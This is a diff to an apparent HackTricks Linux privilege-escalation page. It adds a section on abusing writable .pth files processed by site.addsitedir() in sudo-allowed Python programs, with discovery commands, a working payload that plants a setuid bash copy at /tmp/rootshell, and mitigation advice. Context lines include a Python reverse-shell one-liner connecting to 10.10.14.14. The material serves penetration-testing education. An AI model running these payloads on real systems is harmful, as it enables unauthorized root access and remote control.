@@ -2241,6 +2241,34 @@ To **backdoor the library** just add at the end of the os.py library the followi
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
+#### Writable `.pth` processed by `site.addsitedir()`
+
+Do not treat `site.addsitedir(DIR)` as equivalent to `sys.path.append(DIR)`. It also processes every `*.pth` file in `DIR`. A line beginning with `import` followed by a space or tab is executed as Python code. Path lines are instead resolved relative to the site directory and added only when they exist.<sup>[[38]](#references)</sup>
+
+This becomes a privilege escalation when a sudo-allowed or otherwise privileged Python program calls `site.addsitedir()` on a directory writable by the current user or one of their groups. The `.pth` code runs while the privileged program is setting up its import path, before its normal action is dispatched.<sup>[[38]](#references)[[39]](#references)</sup>
+
+```bash
+# Find explicit consumers and inspect every selected directory's ownership
+grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
+namei -l /opt/app/plugins/dev
+find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls
+
+# Verify execution through a one-line path configuration file
+printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
+sudo /usr/bin/python3 /opt/app/controller.py status
+```
+
+Executable `.pth` content must fit on one line, but semicolons allow several statements. For example, a root execution path can create a setuid Bash copy; invoke Bash with `-p` so it preserves its effective ID.<sup>[[39]](#references)</sup>
+
+```bash
+printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
+  > /opt/app/plugins/dev/pwn.pth
+sudo /usr/bin/python3 /opt/app/controller.py status
+/tmp/rootshell -p
+```
+
+The `-S` option only disables Python's automatic `site` initialization. It does not protect a program that explicitly imports `site` and calls `site.addsitedir()`. Remove attacker-writable directories from privileged import paths and require the directory and its `.pth` files to be owned and writable only by the privileged administrator.<sup>[[38]](#references)[[39]](#references)</sup>
+
 ### Logrotate exploitation
 
 A privileged `logrotate` job can create a cross-user file-write path when it actually rotates a log below a directory that a lower-privileged user can replace or redirect during rotation. A writable log alone is only a lead. Confirm the exact active rule and its `create`, `olddir`, and `su` directives; the scheduler's effective identity; write and search rights on the log's parent; and whether the installed build and policy allow the destination change. A later privileged shell must also load the resulting file for a startup-file write to become command execution. Inspect the schedule, rule, version/packaging, and path metadata without triggering a rotation or attempting the race.
@@ -2385,5 +2413,7 @@ Learn more and see a generalized pattern applicable to other discovery/monitorin
 - [35] [Tweet by @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
 - [36] [redsiege.com - Logging Passwords On Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
 - [37] [tech.feedyourhead.at - Details Of A Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
+- [38] [Python documentation – `site` and path configuration files](https://docs.python.org/3/library/site.html)
+- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
